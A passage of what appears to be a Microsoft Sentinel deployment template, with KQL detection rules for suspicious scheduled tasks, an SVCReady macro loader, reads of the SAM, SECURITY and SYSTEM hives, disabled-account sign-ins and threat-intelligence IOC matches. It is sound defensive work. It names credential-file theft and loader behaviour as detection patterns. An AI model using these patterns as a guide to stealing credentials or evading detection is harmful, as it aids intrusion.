          "enabled": true,
          "query": "let latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;  \nlet EventIDList = dynamic([4702]);\nSecurityEvent\n|where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where SubjectUserName !endswith \"$\"\n| where EventData contains 'command'\n| extend Command = tolower(extract(@'<Data Name=\"TaskContentNew\">.*;Command&gt;(.*?)&lt;/Command&gt;.*</Data>', 1, EventData))\n| extend Argument = tolower(extract(@'<Data Name=\"TaskContentNew\">.*;Arguments&gt;(.*?)&lt;/Arguments&gt;.*</Data>', 1, EventData))\n| extend CmdPath = parse_path(replace_string(Command, '\"', ''))\n| extend DirectoryPath = tostring(CmdPath.DirectoryPath)\n    , Executable = tostring(CmdPath.Filename)\n| extend SusWorkingDir = iff(Command has_any (A1504_SUSPICIOUS_DIR), true, false)\n| extend SusExec =  iff(Executable has_any (A1504_SUSPICIOUS_EXEC), true, false)\n| extend SusCmdArgumentLength = iff(strlen(Argument) >= 100, true, false)\n| where SusWorkingDir and SusExec and SusCmdArgumentLength\n| summarize bv_event_count = count(), bv_dest_user = make_set(TargetUserName, 10), bv_src_dvc = make_set(Computer, 10), bv_start_time = min(TimeGenerated), bv_process_command_line = make_set(strcat(Command, ' ', Argument), 10) by bv_src_user = SubjectUserName, bin_at(TimeGenerated,alert_bin, now())\n| extend RBAScore = 3\n| extend ExtendedDescription = strcat(\n    'bv_start_time: ', bv_start_time\n    ,'\\nbv_src_user: ', bv_src_user\n    ,'\\nbv_dest_user: ', bv_dest_user\n    ,'\\nbv_dest_user_cnt: ',  array_length(bv_dest_user)\n    ,'\\nbv_src_dvc: ', bv_src_dvc\n    ,'\\nbv_process_command_line: ', array_slice(bv_process_command_line, 0, 3))\n| extend VictimEntity = bv_dest_user, AttackerEntity = pack_array(bv_src_user)\n| extend bv_mapping_tag = bv_src_user\n| project \n    bv_start_time\n    , bv_src_user\n    , bv_src_dvc\n    , bv_dest_user\n    , bv_process_command_line\n    , bv_event_count\n    , ExtendedDescription\n    , AttackerEntity\n    , VictimEntity\n    , RBAScore\n    , bv_mapping_tag",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1053"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alerts every time a scheduled task is updated with suspicious parameters which might be indicative of initial or recurring execution of malicious code.\n\n{{ExtendedDescription}}\n\nMITRE: T1053\nCategory: Windows Security\ntag: SOC     "
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2511')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2511')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2511: [SOC] Windows - SVCReady VBA Loader",
          "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms.\n\nThis rule identifies VBA macro runs shellcode that are stored in the properties of the document, which then drops and runs SVCReady malware.\n\nhttps://threatresearch.ext.hp.com/svcready-a-new-loader-reveals-itself/\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n  1. Review associated behavior for the host and user. MITRE: T1059 Category: Windows Security tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);\nlet start_time = 1h;\nlet end_time = now();\nlet latency = 1h;\nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time)..end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| project TimeGenerated, Computer, Account, NewProcessName, ParentProcessName, CommandLine, ProcessId\n| where ParentProcessName endswith @'\\WINWORD.exe'\n| where CommandLine contains @'\\AppData\\LocalTemp' and CommandLine matches regex @'(?i)\\\\[\\w\\.]+\\.dll|\\\\[\\w\\.]+\\.exe'\n| parse Computer with ComputerName '.' ComputerDomain\n| extend ComputerName = iff(isempty(ComputerName), Computer, ComputerName)\n| parse Account with UserDomain @'\\' UserName\n| extend VictimEntity = pack_array(ComputerName, UserName)\n| extend bv_mapping_tag = Account\n| extend ExtendedDescription = strcat(\n'SrcUser: ', Account\n, '\\nSrc: ', Computer\n, '\\nProcessName: ', NewProcessName\n, '\\nProcessCommandLine: ', CommandLine\n, '\\nParentProcessName: ', ParentProcessName\n)\n| project\n    StartTime=TimeGenerated\n    , Src=Computer\n    , SrcUser = Account\n    , ProcessCommandLine=CommandLine\n    , ParentProcessName = ParentProcessName\n    , VictimEntity\n    , ComputerName\n    , ComputerDomain\n    , UserName\n    , UserDomain\n    , ProcessName = NewProcessName\n    , ExtendedDescription\n    , bv_mapping_tag",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Host",
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms.\n\nThis rule identifies VBA macro runs shellcode that are stored in the properties of the document, which then drops and runs SVCReady malware.\n\nhttps://threatresearch.ext.hp.com/svcready-a-new-loader-reveals-itself/\n\nInclusions: None \nExclusions: None \n\n{{ExtendedDescription}}\n\nConsiderations: \n  1. Review associated behavior for the host and user. \n\nMITRE: T1059\nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "UserDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "ComputerDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1501')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1501')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1501: [SOC] Windows - Suspicious Access to SAM Database",
          "description": "This alerts when a user enumerates users and groups in the local Security Accounts Manager (SAM) database. MITRE: T1003 Category: Windows Security tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let EventIDList = dynamic([4663]);    \nlet start_time = 1h;\nlet end_time = now();\nlet latency = 1h;\nlet alert_bin = 1h;\nSecurityEvent\n|where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where Account !endswith \"$\"\n| where ObjectName matches regex @\"\\\\Windows\\\\System32\\\\config\\\\\"\n| extend FileName = tostring(parse_path(ObjectName).Filename)\n| where FileName has_any ('SAM', 'SECURITY', 'SYSTEM')\n| summarize bv_event_count = count(), CompList = make_set(Computer, 10), bv_start_time = min(TimeGenerated), Objects = make_set(ObjectName, 10) by bv_src_user = Account, bv_process = ProcessName, bin_at(TimeGenerated,alert_bin, now())\n| extend ExtendedDescription = strcat(\n            'bv_start_time: ', bv_start_time\n            ,'\\nbv_src_user: ', bv_src_user\n            ,'\\nbv_process: ', bv_process\n            ,'\\nbv_object: ', Objects)\n| extend VictimEntity = array_concat(pack_array(bv_src_user), CompList), AttackerEntity = pack_array(bv_src_user)\n| extend bv_mapping_tag = bv_src_user\n| project \n      bv_start_time\n    , bv_src_user\n    , bv_process\n    , bv_src_dvc = CompList\n    , TimeGenerated\n    , bv_event_count\n    , ExtendedDescription\n    , VictimEntity\n    , AttackerEntity\n    , RBAScore = 3\n    , bv_mapping_tag",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1003"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alerts when a user enumerates users and groups in the local Security Accounts Manager (SAM) database.\n\n{{ExtendedDescription}}\n\nMITRE: T1003\nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-194')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-194')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-194: [RBA] Azure AD - Success from IPs Attempting to Login to Disabled Accounts",
          "description": "This alert identifies IPs with failed attempts to sign in to one or more disabled accounts signed in successfully to another account. MITRE: T1078 Category: Azure AD tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let start_time = 1h;\nlet end_time = now();\nlet start_time_historical = 72h;\nlet latency = 24h;\nlet alert_bin = 1h;\nlet HistoricalOrgActivity = (SigninLogs\n    | where TimeGenerated between (ago(start_time_historical + start_time) .. ago(start_time))\n    | where ResultType == 0\n    | summarize\n        UserPrincipalNames=make_set(UserPrincipalName),\n        UserCount=dcount(UserPrincipalName)\n        by IPAddress);\nSigninLogs \n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where ResultType == '50057' \n| where IPAddress !in (A194_EXCLUDED_IPS)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), LastFail = max(TimeGenerated), disabledAccountLoginAttempts =count(), \n    disabledAccountsTargeted = dcount(UserPrincipalName), applicationsTargeted = dcount(AppDisplayName), applications=make_set(AppDisplayName), disabledAccountSet = make_set(UserPrincipalName), \n    applicationSet = make_set(AppDisplayName)\n    by IPAddress, bin_at(TimeGenerated, alert_bin, now())\n| order by disabledAccountLoginAttempts desc\n//----------------------------------------------------------------------------------------\n| join kind=inner(\n    SigninLogs\n    | where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n    | where ResultType == 0\n    | summarize\n        LastSuccess=max(TimeGenerated),\n        successfulAccountSigninCount = dcount(UserPrincipalName),\n        successfulAccountSigninSet = make_set(UserPrincipalName, 15)\n        by IPAddress, bin_at(TimeGenerated, alert_bin, now())\n    )\n    on IPAddress \n| join kind=leftouter HistoricalOrgActivity on IPAddress\n| where UserCount <= 1\n| where LastSuccess > LastFail\n//only where success account does not match fail account\n| where array_length(set_difference(disabledAccountSet, successfulAccountSigninSet)) > 0\n| extend ExtendedDescription = strcat(IPAddress, ' attempted to log into a ', disabledAccountSet[0], 'a disabled account and then succesfull authenticated to ', successfulAccountSigninSet[0]\n    , '\\n\\nHistorical User Count for ', IPAddress, ': ', UserCount\n    , '\\nApplications: \\n* ', strcat_array(applications, '\\n *')\n    , '\\nHistorical Users: \\n* ', strcat_array(UserPrincipalNames, '\\n *')\n    )\n// put the IP address exclusions here for zscaler and others as needed\n| mv-apply i=bv_zscaler_ip_range to typeof(string) on \n    (extend ExcludedIp = ipv4_is_match(IPAddress, i))\n| where ExcludedIp != true\n| summarize\n    TimeGenerated=min(TimeGenerated),\n    Count=count(),\n    StartTimeUtc = min(StartTimeUtc),\n    EndTimeUtc=max(EndTimeUtc),\n    LastFail=max(LastFail),\n    LastSuccess=max(LastSuccess),\n    Applications=make_set(applications),\n    DisabledAccounts=make_set(disabledAccountSet),\n    SuccessfullAccounts = make_set(successfulAccountSigninSet),\n    UserPrincipalNames=make_set(UserPrincipalNames),\n    Usercount=sum(UserCount)\n    by IPAddress\n| extend ExtendedDescription = strcat(IPAddress, ' attempted to log into a ', DisabledAccounts[0], 'a disabled account and then succesfull authenticated to ', SuccessfullAccounts[0]\n    , '\\n\\nHistorical User Count for ', IPAddress, ': ', Usercount\n    , '\\nApplications: \\n* ', strcat_array(Applications, '\\n *')\n    , '\\nHistorical Users: \\n* ', strcat_array(UserPrincipalNames, '\\n *')\n    )\n| extend bv_rule_version = '1.0.4940'\n| extend bv_rule_timestamp = '1708703307.1658885'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4940 bv_rule_timestamp: 1708703307.1658885'\n| project \n    TimeGenerated\n    , StartTimeUtc\n    , EndTimeUtc\n    , LastFail\n    , LastSuccess\n    , Applications\n    , DisabledAccounts\n    , IPAddress\n    , SuccessfullAccounts\n    , UserPrincipalNames\n    , ExtendedDescription\n    , bv_mapping_tag = IPAddress\n    , bv_rule_combined_string",
          "queryFrequency": "PT1H",
          "queryPeriod": "P3D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies IP addresses with failed attempts to sign in to one or more disabled accounts signed in successfully to another account.\n\n{{ExtendedDescription}}\n\nMITRE: T1078\nCategory: Azure AD\ntag: RBA\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8afb6e58-9ce1-41bd-a188-ea34bb415ab8')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8afb6e58-9ce1-41bd-a188-ea34bb415ab8')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - New VM started",
          "description": "Detects when new VM was started.",
          "severity": "Medium",
          "enabled": true,
          "query": "let a_vm = \nVMwareESXi\n| where SyslogMessage has ('VmPoweredOnEvent')\n//\n| extend DstHostname = extract(@'\\[\\d+\\]\\s+\\[(.*?)\\s+on', 1, SyslogMessage)\n| summarize vm_l = makeset(DstHostname)\n| extend k=1;\nVMwareESXi\n| where SyslogMessage has ('VmPoweredOnEvent')\n| where SyslogMessage !contains \"VDI\"\n| extend DstHostname = extract(@'\\[\\d+\\]\\s+\\[(.*?)\\s+on', 1, SyslogMessage)\n| extend k = 1\n| join (a_vm) on k\n| where vm_l !has DstHostname\n| extend HostCustomEntity = DstHostname\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8f62cd55-cae7-4115-87df-d32ee4286752')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8f62cd55-cae7-4115-87df-d32ee4286752')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map IP entity to OfficeActivity",
          "description": "This query maps any IP indicators of compromise (IOCs) from threat intelligence (TI), by searching for matches in OfficeActivity.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h; // Look back 1 hour for OfficeActivity events\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\nlet OfficeActivity_ = materialize(OfficeActivity\n  | where isnotempty(ClientIP)\n  | where TimeGenerated >= ago(dt_lookBack)\n  | extend ClientIPValues = extract_all(@'\\[?(::ffff:)?(?P<IPAddress>(\\d+\\.\\d+\\.\\d+\\.\\d+)|[^\\]%]+)(%\\d+)?\\]?([-:](?P<Port>\\d+))?', dynamic([\"IPAddress\", \"Port\"]), ClientIP)[0]\n  | extend IPAddress = iff(array_length(ClientIPValues) > 0, tostring(ClientIPValues[0]), '')\n  | project-rename OfficeActivity_TimeGenerated = TimeGenerated);\nlet ActivityIPs = OfficeActivity_ | summarize IPs = make_list(IPAddress);\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = materialize(ThreatIntelligenceIndicator\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | extend TI_ipEntity = coalesce(NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress)\n  | where TI_ipEntity in (ActivityIPs)\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where  Active == true and ExpirationDateTime > now()\n  | where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\");\nIP_Indicators\n// Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation\n| join kind=innerunique (OfficeActivity_)\n  on $left.TI_ipEntity == $right.IPAddress\n// Filter out OfficeActivity events that occurred after the expiration of the corresponding indicator\n| where OfficeActivity_TimeGenerated < ExpirationDateTime\n// Group the results by IndicatorId and keep the OfficeActivity event with the latest timestamp\n| summarize OfficeActivity_TimeGenerated = arg_max(OfficeActivity_TimeGenerated, *) by IndicatorId\n// Select the desired output fields\n| project OfficeActivity_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, TI_ipEntity, ClientIP, UserId, Operation, ResultStatus, RecordType, OfficeObjectId, NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, Type\n| extend timestamp = OfficeActivity_TimeGenerated, Name = tostring(split(UserId, '@', 0)[0]), UPNSuffix = tostring(split(UserId, '@', 1)[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "f15370f4-c6fa-42c5-9be4-1d308f40284e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserId"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "TI_ipEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5ec07168-f097-48ac-a2c5-445a1e3ab840')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5ec07168-f097-48ac-a2c5-445a1e3ab840')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Email entity to OfficeActivity",
          "description": "Identifies a match in OfficeActivity table from any Email IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet emailregex = @'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$';\nlet OfficeEvents = materialize(\n  OfficeActivity\n  | where isnotempty(UserId)\n  | where TimeGenerated >= ago(dt_lookBack)\n  | where UserId matches regex emailregex\n  | project-rename  OfficeActivity_TimeGenerated = TimeGenerated);\nlet OfficeActivityUPNs = OfficeEvents | distinct UserId = tolower(UserId) | summarize make_list(UserId);\nThreatIntelligenceIndicator\n| where isnotempty(EmailSenderAddress)\n| where TimeGenerated >= ago(ioc_lookBack)\n| where tolower(EmailSenderAddress) in (OfficeActivityUPNs)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\"\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (OfficeEvents) on $left.EmailSenderAddress == $right.UserId\n| where OfficeActivity_TimeGenerated < ExpirationDateTime\n| summarize OfficeActivity_TimeGenerated = arg_max(OfficeActivity_TimeGenerated, *) by IndicatorId, UserId\n| project OfficeActivity_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, EmailSenderName, EmailRecipient, EmailSourceDomain, EmailSourceIpAddress, EmailSubject, FileHashValue, FileHashType, UserId, ClientIP, Operation, UserType, RecordType, OfficeWorkload, Parameters\n| extend Name = tostring(split(UserId, '@', 0)[0]), UPNSuffix = tostring(split(UserId, '@', 1)[0])\n| extend timestamp = OfficeActivity_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "4a3f5ed7-8da5-4ce2-af6f-c9ada45060f2",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserId"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ClientIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.7"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0da1a4d7-1a2b-45af-b09c-669697f1626d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0da1a4d7-1a2b-45af-b09c-669697f1626d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Domain entity to Syslog",
          "description": "Identifies a match in Syslog table from any Domain IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;  // Define the time range to look back for syslog data (1 hour)\nlet ioc_lookBack = 14d;  // Define the time range to look back for threat intelligence indicators (14 days)\n// Create a list of top-level domains (TLDs) from the threat feed for later validation\nlet list_tlds = ThreatIntelligenceIndicator\n  | where isnotempty(DomainName)\n  | where TimeGenerated > ago(ioc_lookBack)\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now()\n  | extend parts = split(DomainName, '.')\n  | extend tld = parts[(array_length(parts)-1)]\n  | summarize count() by tostring(tld)\n  | summarize make_list(tld);\n// Fetch the latest active domain indicators from the threat intelligence data within the specified time range\nlet Domain_Indicators = ThreatIntelligenceIndicator\n  | where isnotempty(DomainName)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now()\n  | extend TI_DomainEntity = DomainName;\n// Join the threat intelligence indicators with syslog data on matching domain entities\nDomain_Indicators\n  | join kind=innerunique (\n    Syslog\n    | where TimeGenerated > ago(dt_lookBack)\n    // Extract domain patterns from syslog messages\n    | extend domain = extract(\"(([a-z0-9]+(-[a-z0-9]+)*\\\\.)+[a-z]{2,})\",1, tolower(SyslogMessage))\n    | where isnotempty(domain)\n    | extend parts = split(domain, '.')\n    // Split out the top-level domain (TLD)\n    | extend tld = parts[(array_length(parts)-1)]\n    // Validate parsed domain by checking if the TLD is in the list of TLDs in our threat feed\n    | where tld in~ (list_tlds)\n    | extend Syslog_TimeGenerated = TimeGenerated\n  ) on $left.TI_DomainEntity==$right.domain\n  | where Syslog_TimeGenerated < ExpirationDateTime\n  // Retrieve the latest syslog timestamp for each indicator and domain combination\n  | summarize Syslog_TimeGenerated = arg_max(Syslog_TimeGenerated, *) by IndicatorId, domain\n  // Select the desired columns for the final result set\n  | project Syslog_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, 